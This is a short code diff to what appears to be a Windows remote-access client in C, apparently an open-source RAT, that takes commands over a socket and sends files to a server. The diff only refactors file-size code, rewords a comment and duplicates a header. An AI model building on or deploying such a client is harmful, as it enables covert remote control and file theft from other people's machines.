@@ -2,6 +2,10 @@
 Coded by d4rkstat1c.
 Use educationally/legally.
 */
+/* 
+Coded by d4rkstat1c.
+Use educationally/legally.
+*/
 #include <ws2tcpip.h>
 #include <stdint.h>
 #include <direct.h>
@@ -126,10 +130,7 @@ int send_file(const SOCKET connect_socket, char* const buf) {
 
 	// If File Exists.
 	if (h_file != INVALID_HANDLE_VALUE) {
-	   	// Get file size and serialize file size bytes.
-		LARGE_INTEGER largeint_struct;
-		GetFileSizeEx(h_file, &largeint_struct);
-		f_size = (int32_t)largeint_struct.QuadPart;
+		f_size = sakito_win_fsize(h_file);
 	}
 
 	// Send read file bytes to server.
@@ -214,7 +215,7 @@ int main(void) {
 					// Set all bytes in buffer to zero.
 					memset(buf, '\0', BUFLEN);
 
-					// Receive command + data, to be parsed.
+					// Receive command + parsed data.
 					if (recv(connect_socket, buf, BUFLEN, 0) < 1)
 						break;
 
